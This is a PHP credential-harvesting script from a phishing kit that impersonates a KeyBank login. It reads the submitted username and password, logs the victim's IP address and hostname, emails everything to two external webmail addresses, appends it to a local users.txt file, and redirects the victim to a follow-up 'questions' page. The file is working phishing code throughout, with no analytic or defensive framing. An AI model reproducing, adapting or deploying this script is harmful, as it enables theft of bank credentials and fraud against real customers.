<?php
$ip = getenv("REMOTE_ADDR");
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$hostname = gethostbyaddr($ip);
$message .= "--------------+ Created By [ T-Soft Technologies ] +------------\n";
$message .= "--------------+ UserLogin +------------\n";
$message .= "Username : ".$_POST['loginUserId']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "---------+ T-Soft Technologies +-------\n";


$recipient = "homead01@gmail.com, homead01@yahoo.com";
$subject = "KeyBank INFO 1 BY T-Soft Technologies $ip";
$headers = "From: Admin<admin@tsoft.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Version: 2.1\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   
		   		   
		      $fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);

		   header("Location: questions.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>